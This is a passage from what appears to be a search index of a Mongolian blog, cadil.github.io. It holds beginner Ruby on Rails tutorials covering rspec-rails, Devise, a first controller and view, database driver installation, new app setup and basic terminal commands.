болно. Энэ удаа бид gem \u0026lsquo;rspec-rails\u0026rsquo; дэлгэрэнгүй авч үзнэ. Rspec - ыг ажиллуулах үед capybara-webkit суулгахыг шаардана. Capybara-webkit-ыг суулгахын ѳмнѳ Qt libraries суулгасан байх шаардлагатай. Энд дарж суулгах заавартай танилцаарай.\nrspec-rails rspec-rails нь Rails 3.x 4.x зориулсан testing framework юм. Gemfile - ын group :development, :test do - дотор бичиж ѳгнѳ:\ngroup :development, :test do gem \u0026#39;rspec-rails\u0026#39; gem \u0026#39;capybara-webkit\u0026#39; end Дараагаар нь терминал дээр:\n{% codeblock %} $ bundle install {% endcodeblock %}\nBundle install хийгдэж дууссан бол, rspec - ээ суулгана. Терминал дээр:\n{% codeblock %} $ rails generate rspec:install {% endcodeblock %}\n/spec/rails_helper.rb замаар орон require ‘rspec/rails’ - ыг нэмнэ:\nrequire \u0026#39;rspec/rails\u0026#39; Home Spec /spec - фолдер дотор features - фолдер шинээр үүсгэнэ. Энэ фолдер дотор бид spec-үүдээ бичээд явах юм.\n{% codeblock %} $ cd spec $ mkdir features {% endcodeblock %}\nШинээр үүсгэсэн features - фолдер дотроо home_spec.rb - үүсгэж ѳгнѳ:\n{% codeblock %} $ vi /spec/features/home_spec.rb {% endcodeblock %}\nЭнэ хичээлийн явцад [Vim](https://en.wikipedia.org/wiki/Vim_(text_editor) ашиглах ба та ѳѳрийн дурын editor-ыг ашиглах боломжтой.\nrequire \u0026#39;rails_helper\u0026#39; feature \u0026#34;Home page уруу орох\u0026#34; do scenario \u0026#34;Хэрэглэгч, тавтай морилно уу гэсэн текст харах\u0026#34; do visit root_path expect(page).to have_text(\u0026#34;Тавтай морилно уу CaDiL\u0026#34;) end end Spec - ыг ажиллуулах Бүх spec - ыг ажлуулах:\n{% codeblock %} $ rspec {% endcodeblock %}\nФолдер дотор байгаа spec-үүдыг ажлуулах:\n{% codeblock %} $ rspec spec/features {% endcodeblock %}\nНэг spec ажлуулах:\n{% codeblock %} $ rspec spec/features/home_spec.rb {% endcodeblock %}\nSpec-ын дагуу rspec ажиллуулж үзэн гарсан алдааны мэдээллээр алдааг засаж үзье.\nHome controller - ыг index method - той хамт үүсгэх:\n{% codeblock %} $ rails g controller Home index {% endcodeblock %}\nHome index - ыг үндсэн хуудсаар сонгож ѳгѳхын тулд app/config/routes.rb - уруу орон:\nroot \u0026#39;home#index\u0026#39; бичиж ѳгнѳ.\nШинээр үүсгэсэн Home index үрүү орон доорх мѳрийг бичиж ѳгнѳ:\n\u0026lt;p\u0026gt;Тавтай морилно уу CaDiL\u0026lt;/p\u0026gt; ","permalink":"https://cadil.github.io/posts/2016-04-13-rspec-rails-gem/","summary":"Танилцуулга Хамгийн хэрэгтэй гэсэн Development - gem - үүдээс эхнээс нь танилцаж явах болно. Мэдээж бид бүхэнд юуны ѳмнѳ rspec-rails gem хэрэгтэй. Rspec нь тест хийх зориулалттай framework ба олон талт боломжуудтай юм.\nDev Gems group :development, :test do gem \u0026#39;better_errors\u0026#39; gem \u0026#39;capybara-webkit\u0026#39; gem \u0026#39;factory_girl_rails\u0026#39; gem \u0026#39;ffaker\u0026#39; gem \u0026#39;database_cleaner\u0026#39; gem \u0026#39;letter_opener\u0026#39; gem \u0026#39;rspec-rails\u0026#39; gem \u0026#39;pry\u0026#39; gem \u0026#39;pry-nav\u0026#39; gem \u0026#39;pry-rails\u0026#39;, \u0026#39;~\u0026gt; 0.3.2\u0026#39; gem \u0026#39;simple_bdd\u0026#39; gem \u0026#39;shoulda-matchers\u0026#39; gem \u0026#39;spring\u0026#39; end Дээр байгаа нийт 13 Development, test - gem - үүдийг нэг нэгээр нь дэлгэрэнгүй үзэх болно.","title":"Rspec-rails gem"},{"content":"Devise Gem Devise нь Rails дээр суурилсан уян хатан authentication шийдлийн нэг юм.\nRack дээр суурилсан Rails engine дээр суурилсан бүрэн MVC шийдэл юм Нэг цагт олон моделиуд зэрэг хандалт хийх боломжтой Инфо Devise ѳргѳн ашиглагддаг gem болохоор internet-ээс хайхад хүссэн мэдээллээ авах боломжтой. Доорх линкээр орон мэдээлэл авах боломжтой: Devise\nЭхлэл Devise 4.0 нь Rails 4.2 болон 4.2 дээшээ загваруудыг дэмжин ажиллана. Gemfile дотор хуулж ѳгѳх:\ngem \u0026#39;devise\u0026#39; Хуулсан бол bundle install командыг ашиглан суулгана:\nbundle install Gemfile дотроо хуулан bundle install хийсэн бол generate хийн суулгах хэрэгтэй:\nrails generate devise:install Generate хийх явцад тохиргооны хэсэг гарч ирэх ба тэдгээрийг зааврын дагуу суулгах шаардлагатай. Тохиргоог хийж дууссан бол generate ашиглан Devise-д модель үүсгэж ѳгнѳ:\nrails generate devise MODEL MODEL - ын оронд апплкейшны хэрэглэгчийн классын нэрийг бичиж ѳгнѳ. Уг тохиолдолд User эсвэл Admin байж болно. Модель үүсгэсэн бол rake db:migrate хийж ѳгнѳ\nrake db:migrate Helper Devise нь controller болон views дотор helper үүсгэж ѳгсѳн байгаа. Controller хэсэгт user authentication оруулж ѳгѳх бол before_action (тухайн моделийг User гэж үзвэл)\nbefore_action :authenticate_user! Devise model - т User - ээс ѳѳр утга оноож ѳгсѳн бол “_user” оронд “_ѳѳрийн утга”аа онож ѳгѳх зарчмаар явна.\nХэрэглэгч бүртгүүлсэн болохыг шалгах helper:\nuser_signed_in? Одоогоор нэвтрэн орсон хэрэглэгч:\ncurrent_user Session рүү энэ хүрээллээр нэвтрэх боломжтой:\nuser_session ","permalink":"https://cadil.github.io/posts/2016-04-12-devise-gem/","summary":"Devise Gem Devise нь Rails дээр суурилсан уян хатан authentication шийдлийн нэг юм.\nRack дээр суурилсан Rails engine дээр суурилсан бүрэн MVC шийдэл юм Нэг цагт олон моделиуд зэрэг хандалт хийх боломжтой Инфо Devise ѳргѳн ашиглагддаг gem болохоор internet-ээс хайхад хүссэн мэдээллээ авах боломжтой. Доорх линкээр орон мэдээлэл авах боломжтой: Devise\nЭхлэл Devise 4.0 нь Rails 4.2 болон 4.2 дээшээ загваруудыг дэмжин ажиллана. Gemfile дотор хуулж ѳгѳх:\ngem \u0026#39;devise\u0026#39; Хуулсан бол bundle install командыг ашиглан суулгана:","title":"Devise gem"},{"content":"MVC Rails нь MVC framework буюу тогтолцоо юм. Rails нь browser - ѳѳс ирэх хүсэлтүүдийг хүлээн авч controller-т ирсэн хүсэлтүүдийг декод (тайлж унших) хийх бѳгѳѳд уг болж байгаа процессыг action method гэж нэрлэдэг.\nRails - аас авах нэг сайн тал гэвэл дотоод холболтууд нь цэгцтэй, дэс дараалалтай ер нь хамгийн сайн бүтэцтэй. “Hello World” - энгийн апплкейшн бичихийн тулд Controller, View шинээр үүсгэж кодлоно. Мэдээж энэ хоёрыг холбож ѳгсѳн холбоос, зам (route) хэрэгтэй. Нэг зүйл дутаагаад байна уу даа, гэж бодож байж магадгүй. Model - ыг яагаад бичихгүй юм бэ гэж гайхаж байгаа байх, хариулт нь, бидний одоо бичиж энэхүү апплкейшн нь ямар нэг байдлаар Data ч юм уу ѳгѳгдлийн сантай холбогдохгүй болохоор Model-ыг шууд алгасая. Эхлээд Controller - оос эхэлцгээе. Шинээр апплейкшн үүсгэж байсан райлс командыг ашиглан одоогийн бяцхан тѳсѳл дотроо controller үүсгэх юм. rails generate - гэх энэ райлс командыг ашиглах ба цаашид бид rails g гэж товчилж бичиж явна шүү. Controller үүсгэж байгаа rails g - араас script бичиж ѳгѳх байгаа. За, “Say” гэсэн controller үүсгэцгээе.\ndemo\u0026gt; rails g controller Say hello goodbye create app/controllers/say_controller.rb route get \u0026quot;say/goodbye\u0026quot; route get \u0026quot;say/hello\u0026quot; invoke erb create app/views/say create app/views/say/hello.html.erb create app/views/say/goodbye.html.erb invoke test_unit create test/controllers/say_controller_test.rb invoke helper create app/helpers/say_helper.rb invoke test_unit create test/helpers/say_helper_test.rb invoke assets invoke coffee create app/assets/javascripts/say.js.coffee invoke scss create app/assets/stylesheets/say.css.scss За terminal доошоогоо бас л баахан шинэ файл, directories үүсчихлээ дээ. Удахгүй эдгээр файлууд нь ямар учиртай болохыг зах зухаас нь онгичож үзэцгээнэ. Ямартай ч эхлээд чухлаас нь:\nclass SayController \u0026lt; ApplicationController def hello end def goodbye end end Хоосон, ил хул, код байхгүй юм шиг санагдаж байна уу? Нѳгѳѳ гоё удамшил ороод ирсэн байгаа юм л даа. Энгийнээр бол SayController гэсэн class нь ApplicationController - оос удамшчихлаа гэж. Нэг ёсондоо автомотоор бүхий л default утгуудыг нь ѳѳртѳѳ авчихлаа гэсэн үг л дээ. Тэхээр дээр байгаа код юу хийж болох, эсвэл яг одоогоор ямар үүрэг гүйцэтгэж байна гэж хэдүүлээ ѳѳрсѳддѳѳ асуулт тавиад үзэцгээе. Одоогоор бол дээрх код юу ч хийхгүй, ямар ч үүрэггүй байгаа л гэсэн үг. Маш энгийн, бидэнд hello() бас goodbye() гэсэн хоёр хоосон (empty) action method - ууд л байна. Яагаад бас hello(), goodbye() гэсэн method гараад ирэв ээ, гэж гайхаж байгаа байх. Энэ хэсгийг ойлгохын тулд ѳѳр нэг хэсэг үрүү ѳндийж харахгүй бол болохгүй нь дээ. Rails Handles requests буюу ирж байгаа хүсэлтүүдийг зохицуулагч.\nRails болон Request URLs Яг л бусад веб апплкейшнуудын адил, Rails application - ын URL хаягийг хэрэглэгчтэй холбож ѳгч байгаа холболт юм. Тухайн URL - руу хандах хүсэлт browser - ээс явуулахад ар талд нь мэдээж тухайн хүсэлтийг боловсруулан (апп кодууд), эргүүлэн хэрэглэгч рүү хүргэх юм. Туршаад үзье. http://localhost:3000/say/hello - энэ хаяг руу хандалт хийгээд үзэцгээе.\nAction Дараагийн алхам маань дэлгэцэнд юу харуулах вэ гэх асуулт. Энэ хэсгээс л View орж ирж байгаа юм даа. Controller - шинээр үүсгэж байхдаа бид бүхэн ямар script ашиглаж байсныг санаж байна уу? Санахгүй байгаа бол эргүүлэн нэг хараарай. Тэр командаар терминал доошоо олон файл, directory үүссэн байхаа. Тэр дунд template файл буюу controller-ын views - үүссэн байгаа.. Үүннээс үзэхэд бид Say нэртэй controller үүсгэсэн. Тэгэхээр views маань app/view/say - directory-д байгаа юм.\n\u0026lt;h1\u0026gt;Hello from Rails!\u0026lt;/h1\u0026gt; hello.html.erb - файлаа хадаглаад, browser - оо refresh хийгээд үзээрэй. Одоо ойлгосон байх, тийм үү.\nДүгнээд нэг харахад, бид Rails Application Tree - гээс хоёр файлын утга, арга, үүрэг зэргийг судлаад эзэмшчихлээ. Controller гэж юу болох талаар мэдэж авлаа, browser дээр template - modify хийж үзлээ. За тэгээд, Rails-ын шатлалыг харвал: controller нь app/controller дотор, views нь app/views гэсэн subdirectories дотор байрлаж байна.\nDynamic Апп гэж хэлэхэд хэцүү нэг энгийн static page ямартай ч хийчихлээ. Бага зэрэг Dynamic болговол ямарав, орох болгонд хэдэн цаг болж байгааг харуулдаг хэсэг нэмж ѳгцгѳѳе. Нэмэхийн тулд views-д байгаа template файлыг ѳѳрчлѳх хэрэгтэй. Цаг (Time) - харуулах string хэрэг болох юм. Үүнээс улбаалаад хоёр асуулт үүснэ. Нэгт, хэрхэн яаж Dynamic Content - оо одоо байгаа template - дээ нэмэх вэ? Хоёрт, цагаа хаанаа авах юм бэ?\nDynamic Content Райлс дотор Dynamic загвар оруулах олон арга бий. Хамгийн ѳргѳн ашигладдаг нь за одоо заагаад ѳгье. Ruby кодыг Template - тэйгээ embed (зарим энэ мэт үгийг орчуулахгүйгээр шууд хэрэглээд явна, угаасаа ч орчуулдахааргүй үг) хийх юм. Тиймээс л бид template файлаа show.html.erb гэж хадагалсан юм. Html.erb гэсэн формат залгаж бичсэн шалтгаан нь ERB гэсэн системыг Rails ѳрѳгжүүлэн дэмжээд явна. ERB нь Ruby - ын нэгэн хэсэг болж суудаг ба суулгах энэ тэрээ зүйл дээр санаа зовоод байх хэрэггүй. Erb нь output - үүдыг хувирган юу ч хамаагүй болгож болдог. Энгийнээр бол \u0026lt;%= and %\u0026gt; - гэх код нь Рубю кодоор танигдах хэдий ч үр дүнд нь string болон хѳрвүүлэгдэж байгаад л онцлог юм. Тэхээр \u0026lt;% … %\u0026gt; уг кодын дотор л утга аа оруулаад ѳгѳхѳд л үр дүн нь хэвлэгдэх юм. Жишээ нь:\n\u0026lt;h1\u0026gt;Hello from Rails!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; Одоо цаг \u0026lt;%= Time.now %\u0026gt; болж байна. \u0026lt;/p\u0026gt; Одоо browser - оо refresh хийгээд үз. Харагдаж байгаа цаг бол Ruby - ын standard format - аар харагдаж байгаа.\nЦаг нэмэх Ерѳнхийдѳѳ applcation - оо Dynamic болгох ганц хоёр алхамтай танилцлаа.. Дараагийн алхам бол одоо харагдаж байгаа цаг нь хаанаас дамжин харагдаж байгааг тогтоон address хийж ѳгѳх юм.\nRuby-гын Time.now() method нь embed хийж hello.html.erb загварт дуудан ѳгч ажиллаж байна. Хэрэглэгч, хандагч, уг page руу хандах бүр хэдэн цаг болж байгааг яг таг харуулж байна. Жижиг хэмжээний ѳѳрчлѳлт оруулж үзэцгээе. Одоо харагдаж байгаа view хэсгийг энэ чигт нь үлдээж controller хэсэгт цагийг байрлуулах шаардлагатай гэж үзээд Controller хэсэгт action method - ыг @time гэсэн хувьсагчид орлуулна. class SayController \u0026lt; ApplicationController def hello @time = Time.now end def goodbye end end .html.erb - загвар дотор, controller хэсэгт оруулж ѳгсѳн хувьсагчаа орлуулж бичнэ.\n\u0026lt;h1\u0026gt;Hello from Rails!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; It is now \u0026lt;%= @time %\u0026gt; \u0026lt;/p\u0026gt; Browser - ѳѳ refresh хийгээд харвал controller дээр нэмсэн хувьсагч маань views хэсэгт буюу энэ хоёрын хооронд утга дамжин амжилттайгаар дэлгэцэд хэвлэн харуулж байна. Яагаад заавал controller - оос харуулж байгаа зүйлийг views - дээр зарлан, хоёр гурван юм нэмж хийж, ажил удаад байгаа юм гэж гайхаж магадгүй. Уг Application - дотор бол ингэж хийсэн хийгээгүй нээх ѳѳрчлѳлт гарахгүй. Гэхдээ логикоор харвал ингэж хийх нь бидэнд ашигтай юм. Жишээ нь: Application - оо цаашид хѳгжүүлж олон орны хэрэглэгч хандалт хийх боломжтой болгоё гэж тѳсѳѳлье. Үүн дээр үндэслэхэд, тухайн орны цагын бүсээс хамааран дэлгэцэнд хэдэн цаг болж байгааг харуулах нь чухал. Ингэж харуулахад хангалттай хэмжээний код нэмж бичих хэрэг болно. Харин энэ их хэмжээний код нь views - д тийм тохиромжтой шийдэл болж чадахгүй л болох уу! Харин controller - т цагийг харуулахаар шийдэж ѳгснѳѳр уг application - ыг илүү уян хатан боглож ѳгч байгаа ба controller хэсгээс ѳѳрчлѳсѳн цагын бүс нь views хэсэгт мѳн time object - ыг update хийгээд байх шаардлага байхгүй гэсэн үг юм. Цагыг Data гэж үз, тэгвэл заавал view болон controller - тэй холбогдсон байх шаардлагтай. Цаашид Model гэж судлаад ирэхээр бид энэ тухай илүү ихийг сурах болно.\nДүгнээд нэг харвал Хэрэглэгч уг application-нд хандалтыг local-оос http://localhost:3000/say/hello - URL хаягаар хандан орсон.. Rails - routes - ыг тааруулж ѳгсѳн. 2 хэсэгт хуваан авч үзвэл, say хэсэг нь controller хэсгийг авч, ингэснээр Rails нь шинээр Ruby-гын SayController хэсгийг дуурайлган буюу удамшуулан үүсгэх боломжтой болсон. (app/controllers/say_controller.rb - гэх дарааллаар олж болно) Дараагийн хэсэгт нь hello - ыг action - гэдгийг тодорхойлсон. Rails нь тухайн нэрийн дагуу controller - оос method - ыг дуудсан. Энэхүү action method нь time object - ыг үүсгэж, @time гэсэн хувьсагч болгосон. Rails нь загвар ашиглан үр дүнг дэлгэцэд хэвлэдэг болсон. App/view directory -\u0026gt; subdirectory нь controller-ын (say) - тэй адил нэрээр, тэрхүү subdirectory дотор hello.html.erb. Rails нь уг файлыг ERB templating system - руу боловсруулан, controller хэсэгт утгыг (value) заан Ruby - д оруулж (embed) ѳгсѳн. Үр дүнг browser дээрээс харахад, Rails хүсэлтүүдийг боловсруулан, ажиллаж байсан. Pages - үүдыг холбох Нэг хуудастай Web Application гэж ч бас хаана байхав. Энэ удаа бид applicaiton - доо энгийн веб загвар хийж үзэцгээе.\n2 action - доо нэг controller ашиглана. Яагаад гэвэл бидэнд одоо шинээр controller - үүсгээд байх шаардлага гараагүй болохоор.\nGoodbye action - г controller - т define хийгээд ѳгчихсѳн болохоор одоо app/views/say дотор шинэ template үүсгэж ѳгѳх юм. Goodbye.html.erb гэж байгаа учир нь action нь default template загвар авах үедээ action - ын нэртэй холбогдож байдаг болохоор гэж ойлгож болно. \u0026lt;h1\u0026gt;Goodbye!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; Энд байх сайхан байна. \u0026lt;/p\u0026gt; Browser - рүүгээ ороод энэ удаа URL хаягаа ѳѳрчлѳѳд хандалт хийнэ. http://localhost:3000/say/goodbye\nХарин одоо хоёр page - ээ хооронд нь холболт хийх хэрэгтэй. Hello page - ыг Goodbye page - тэй холбоно. Цаашид application хийхдээ хоорондын холболтыг button ашиглаж хийнэ, энэ удаа зүгээр hyperlink - ашиглаад хийчихье.\nhello.html.erb - иймэрхүү байдлаар:\n\u0026lt;p\u0026gt;\u2028Say \u0026lt;a href=\u0026#34;/say/goodbye\u0026#34;\u0026gt;Goodbye\u0026lt;/a\u0026gt;! \u0026lt;/p\u0026gt; Харин goodbye.html.erb:\n\u0026lt;p\u0026gt;\u2028Say \u0026lt;a href=\u0026#34;/say/hello\u0026#34;\u0026gt;Hello\u0026lt;/a\u0026gt;! \u0026lt;/p\u0026gt; Дээрx аргаар бичиж болно, асуудалгүй ажиллана. Нѳгѳѳ талаас жаахан эмзэг л болох юм даа. Уг Application - ынхаа web server - ыг ѳѳрчлѳѳд үзьѳ гэж бодоход URL - ууд шууд танихаа болино. Тийм болохоор, бид иймэрхүү эрсдэл хүлээх хэрэг байхгүй. Rails цаанаасаа маш олон helper, methods байдаг болохоор ур аргуудыг views, template - д ашиглаж болно. Жишээл нь: link_to() - энэ method нь action - нд hyperlink үүсгэж ѳгдѳг жишээтэй. Басаж болохгүй, энэ method - ын хийж чадах зүйл их шүү. hello.html.erb - дээ link_to() - ашиглаад үзье:\n\u0026lt;h1\u0026gt;Hello from Rails!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; It is now \u0026lt;%= @time %\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; Time to say \u0026lt;%= link_to \u0026#34;Goodbye\u0026#34;, say_goodbye_path %\u0026gt;! \u0026lt;/p\u0026gt; Түр зогсоод энэ мѳрийг сайн харьцгаая:\n\u0026lt;%= link_to \u0026#34;Goodbye\u0026#34;, say_goodbye_path %\u0026gt; Link_to - оор дуудах үйлдэл хийгдэж байна. (Rails-д method-ыг templates, helpers- ыг бичихид илүү хялбар болгож ѳгсѳн) say_goodbye_path нь зам гээд ойлгоход болно доо.\nGoodbye.html.erb - мѳн адил аргаар:\n\u0026lt;h1\u0026gt;Goodbye!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt; It was nice having you here. \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; Say \u0026lt;%= link_to \u0026#34;Hello\u0026#34;, say_hello_path %\u0026gt; again. \u0026lt;/p\u0026gt; За энэ хүрээд энгийн туршилтын application маань дуусаж байна. Дараагийн хичээлээр бид жинхэнэ application хийхэд суралцах болно. Юу хийсэн бэ? Rails application хэрхэн шинээр үүсгэх, үүсгэсэн application - доо controller шинээр үүсгэж сурлаа. Хэрхэн Dynamic контентыг controller дээр үүсгэх, үүсгэсэн контентоо view - ыг ашиглан харуулахад суралцсан. Хэрхэн page хооронд холбох талаар үзлээ. ","permalink":"https://cadil.github.io/posts/2016-01-04-hello/","summary":"MVC Rails нь MVC framework буюу тогтолцоо юм. Rails нь browser - ѳѳс ирэх хүсэлтүүдийг хүлээн авч controller-т ирсэн хүсэлтүүдийг декод (тайлж унших) хийх бѳгѳѳд уг болж байгаа процессыг action method гэж нэрлэдэг.\nRails - аас авах нэг сайн тал гэвэл дотоод холболтууд нь цэгцтэй, дэс дараалалтай ер нь хамгийн сайн бүтэцтэй. “Hello World” - энгийн апплкейшн бичихийн тулд Controller, View шинээр үүсгэж кодлоно. Мэдээж энэ хоёрыг холбож ѳгсѳн холбоос, зам (route) хэрэгтэй.","title":"Hello, Rails!"},{"content":"Райлс апплкейшнг ѳѳр database - тэй холбох Райлс апплкейшнг ѳѳр database - тэй холбох гэж байгаа бол DB2, MySQL, Oracle, Postgres, Firefird болон SQL Server гэх мэтээр сонголтууд бий. SQLite 3 - ыг Райлс апплкейшнтэй холбож ашиглахын ѳмнѳ database driver суулгаж Library нь Райлсын database engine-тэй холбож ѳгѳх хэрэгтэй.\nѲѳрийн хувийн Rails API Documentation үүсгэх\nLocal орчинд ѳѳрийн Rails API Documentation үүсгэх боломжтой юм. Маш энгийн, доорх командыг ѳѳрийн терминал дээр бичихэд л хангалттай.\nrails_apps\u0026gt; rails new dummy_app rails_apps\u0026gt; cd dumny_app dumny_app\u0026gt; rake doc:rails Хамгийн сүүлд бичсэн мѳр бага зэрэг хугацаа авна. Уншиж дуусмагц, Rails API Documentation нь doc/api гэсэн directory tree үүснэ. Нэг зѳвѳлгѳѳ хэлэхэд уг directory-г ѳѳрийн desktop уруу хуулаад dumnуapp tree -г устгах нь зүйтэй. Rails API Documentation - хандах бол browser дээрээс doc/apo/index.html хаягаар орох боломжтой. Дэлгэрэнгүй мэдээллийг тухайн цахим хаягаар орон шалгана уу:\nDB 2: http://raa.ruby-lang.org/project/ruby-db2 эсвэл http://rubyforge.org/projects/rubyibm Firebird: http://rubyforge.org/projects/fireruby/ MySQL: http://www.tmtm.org/en/mysql/ruby/ Oracle: http://rubyforge.org/projects/ruby-oci8 Postgres: https://bitbucket.org/ged/ruby-pg/wiki/Home SQL Server: https://github.com/rails-sqlserver SQLLite: https://github.com/luislavena/sqlite3-ruby MySQL MySQL server болон client суулгая:\nsudo apt-get install mysql-server mysql-client libmysqlclient-dev Суулгах явцад root user - ын нууц үгийг шинээр үүсгэж ѳгнѳ. libmysqlclient-dev - ыг суулгаж ѳгснѳѳр mysql2 gem - ыг compile хийж Райлс аппд MySQL-ыг холбох тохиргоог хийж ѳгѳх юм.\nPostgreSQL Шинэ repository-г нэмж ѳгѳѳд Postgre 9.3 суулгана:\nsudo sh -c \u0026quot;echo 'deb http://apt.postgresql.org/pub/repos/apt/ precise-pgdg main' \u0026gt; /etc/apt/sources.list.d/pgdg.list\u0026quot; wget --quiet -O - http://apt.postgresql.org/pub/repos/apt/ACCC4CF8.asc | sudo apt-key add - sudo apt-get update sudo apt-get install postgresql-common sudo apt-get install postgresql-9.3 libpq-dev Postgre-г суулгах явцад user тохиргоог хийж ѳгѳхгүй. Тийм болохоор дээр зааврын дагуу хийж тохиргоогоо хийгээрэй. chris - оронд ѳѳрийн нэрийг бичин гэж бодох хэрэгтэй.\nsudo -u postgres createuser chris -s # User-т нууц үгтэй хиймээр байна уу? Доорк коммандыг дагаад хийнэ үү. sudo -u postgres psql postgres=# \\password chris ","permalink":"https://cadil.github.io/posts/2016-01-04-ror-with-database/","summary":"Райлс апплкейшнг ѳѳр database - тэй холбох Райлс апплкейшнг ѳѳр database - тэй холбох гэж байгаа бол DB2, MySQL, Oracle, Postgres, Firefird болон SQL Server гэх мэтээр сонголтууд бий. SQLite 3 - ыг Райлс апплкейшнтэй холбож ашиглахын ѳмнѳ database driver суулгаж Library нь Райлсын database engine-тэй холбож ѳгѳх хэрэгтэй.\nѲѳрийн хувийн Rails API Documentation үүсгэх\nLocal орчинд ѳѳрийн Rails API Documentation үүсгэх боломжтой юм. Маш энгийн, доорх командыг ѳѳрийн терминал дээр бичихэд л хангалттай.","title":"Rails болон ѳгѳгдлийн сан"},{"content":"Апп үүсгэх Шинээр райлс апплейкшн create хийхийн ѳмнѳ бид эхлэл хэсгээсээ эхлээд зохион байгуулал, эмх цэгцтэй байх хэрэгтэй. Work гэсэн нэртэй ** шинэ directory ** үүсгэнэ. Энэ ** work ** гэсэн directory дотор тѳслүүдээ шинээр үүсгээд явбал эмх цэгцтэй, амар юм. Work - дотор demo гэсэн райлс аппклейкшн үүсгэцгээе.\nrubys\u0026gt; mkdir work rubys\u0026gt; cd work work\u0026gt; rails new demo create create README.rdoc create Rakefile create config.ru : :\t:\t: create vendor/assets/stylesheets create vendor/assets/stylesheets/.keep run bundle install Fetching gem metadata from https://rubygems.rog/....... : :\t:\t: Your bundle is complete! Use 'bundle show [gemname]' to see where a bundled gem is installed work\u0026gt; Дээр бичигдсэн ** rails new demo** коммандаар бид demo нэртэй ** directory** үүсгэлээ. Терминал доошоогоо subdirectory болон олон шинэ файлуудыг автомотаар default - аар үүсгэж ѳгѳв.\nwork\u0026gt; cd demo demo\u0026gt; ls -p app/ config/ db/ Gemfile.lock log/ Rakefile test/ vendor/ bin/ config.ru Gemfile lib/ public/ README.rdoc tmp/ Гэх мэтээр directory - ууд үүсгэх ба энэхүү chapter - т бид эдгээрийг ашиглах шаардлага одооогоор гарахгүй ба зѳвхѳн app/ directory-д ѳѳрсдийн кодоо бичих нэмж оруулах юм.\nДоорх коммандаар дэлгэрэнгүй мэдээлэл авах боломжтой:\ndemo\u0026gt; rake about Мѳн дээрх кодоор алдаа хайж болдог ба жишээ нь JavaScript runtime - олдохгүй байгаа бол алдааны мэдээлэл гаргаж боломжит линкүүдээс татаж авах хүсэлт ирүүлнэ.\nrake about - аар алдаа илэрээгүй бол цааш үргэлжүүлцгээе. Одоо юу хийх хэрэгтэй вэ гэхээр Stand-alone Web server - ыг асаахад л болно. Ингэж server асааж байж л бид шинээр үүсгэсэн райлс аппклейншаа ажиллуулах юм.\ndemo\u0026gt; rails server =\u0026gt; Booting WEBrick =\u0026gt; Rails 4.0.0 application starting in development on http://0.0.0.0:30000 =\u0026gt; Run 'rails server -h' for more startup options =\u0026gt; Ctrl+C to shutdown server [2013-04-18 20:22:16] INFO WEBrick 1.3.1 [2013-04-18 20:22:16] INFO ruby 2.0.0 (2013-02-24) [x86_64-linux] [2013-04-18 20:22:16] INFO WEBrick::HTTPServer#start: pid=25170 port=3000 Web Server нь ямар server суулгасан эсэхээс шалтгаалан ажиллах ба Ruby-гийн хувьд WEBrick server нь ruby-гийн цѳм нь болж ѳгсѳн нэг үгээр бол ruby-г илтгэж чадахаар нэгэн бүхэл хэсэг нь болсон сервер юм. Гэхдээ яах уу, ѳѳрийн дурын веб серверыг суулган Ruby on Rails тай хослуулан ажиллуулж болно. Доорк коммандыг ашиглан WEBrick-ыг хүчлэн (force) ажиллуулж болно.\ndemo\u0026gt; rails server webtrick Сервер асаасан код боксын хамгийн сүүлийн мѳрийг харвал server нь port:3000 дээр ассан байна. 0.0.0.0 гэсэн холболтыг авч үзвэл WEBrick нь тухайн address-д connection - д бүхэл талын зѳвшѳѳрлыг олгож байна гэж ойлгож болно. Ойлгогдохоор хэлбэл дурын browser дээр http://localhost:3000 address - аар хандан сервер рүү холбогдох юм.\nСервер ээ асаагаад localhost-oos харж болж байна. Терминал дээр сервер дээр болж байгаа үйл явцыг tracking - хийх боломжтой юм.\nCtrl + C - командыг ашиглан WEBrick-ыг унтраана. Гэхдээ одоохондоо битгий унтраагаарай бид цааш үргэлжлүүлэн явах болхлоор…\nАпплкейшнаа үүсгээд сервер ээ асаачихлаа, харин ерѳѳсѳѳ код бичсэнгүй ээ, тийм ээ? Дараагийн хэсгээс код уруу орцгооё!\n","permalink":"https://cadil.github.io/posts/2016-01-04-shineer-applieikshn-uusghekh.%D0%BC%D0%B4/","summary":"Апп үүсгэх Шинээр райлс апплейкшн create хийхийн ѳмнѳ бид эхлэл хэсгээсээ эхлээд зохион байгуулал, эмх цэгцтэй байх хэрэгтэй. Work гэсэн нэртэй ** шинэ directory ** үүсгэнэ. Энэ ** work ** гэсэн directory дотор тѳслүүдээ шинээр үүсгээд явбал эмх цэгцтэй, амар юм. Work - дотор demo гэсэн райлс аппклейкшн үүсгэцгээе.\nrubys\u0026gt; mkdir work rubys\u0026gt; cd work work\u0026gt; rails new demo create create README.rdoc create Rakefile create config.ru : :\t:\t: create vendor/assets/stylesheets create vendor/assets/stylesheets/.","title":"Шинээр апплейкшн үүсгэх"},{"content":"Оршил Руби дээр ажиллаж байх үед терминалтай бол байнга ажиллана. Хэрвээ терминал дээр ажиллаж мэдэхгүй бол анхан шатны хэдэн коммандуудын үүргийг тайлбарлан бичсэн байгаа.\nSUDO Kомманд Дийлэнх комманд нь sudo - оор эхэлдэг. SUDO буюу superuserdo нь тухайн роот хэрэглэгчийн бүрэн эрхийг идэвхжүүлэх, тухайн роот хэрэглэгчийн фолдер, файлыг бүрэн эрхтэйгээр удирдах эрх олгож байгаа юм. Sudo коммандыг ашиглах үѳд гараас хэрэглэгчийн нууц үгийг оруулж ѳгѳх ёстой.\nФайл болон Зам (Directory) Долгионтой тэмдэгт (~) ээр home directory-г илэрхийлнэ. Xэрэглэгч буюу user, долгионтой тэмдэгт (~) харагдаж байвал /home/user directory-д байна гэсэн үг.\npwd Энэ коммандын тусламжтайгаар аль directory-д байгаагаа мэдэж болно. Нэг үгээр бол замыг хэвлэн дэлгэцэнд харуулна. Жишээлбэл: Desktop directory дотор pwd комманд бичсэн гэж үзэхэд “~/Desktop” гэснийг терминал дээр хэвлэн харуулах юм. ls Directory дотор байгаа файлуудын list буюу нэрс, агуулгыг харуулна. ls -ын араас ѳѳр коммандууд ашиглан, тухайн directory дотор байгаа файлуудын хэмжээ, 